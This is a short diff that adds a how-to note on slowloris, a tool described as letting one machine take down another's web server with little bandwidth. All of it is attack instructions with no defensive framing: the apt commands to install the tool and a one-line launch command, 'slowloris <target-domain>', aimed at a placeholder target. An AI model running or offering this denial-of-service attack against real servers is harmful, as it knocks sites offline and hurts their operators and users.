@@ -1,0 +1,10 @@
+Using slowloris
+slowloris is a tool that allows a single machine to take down another machine's web server with minimal bandwidth.
+
+Install slowloris:
+
+sudo apt update
+sudo apt install slowloris
+Launch slowloris attack:
+
+slowloris <target-domain>
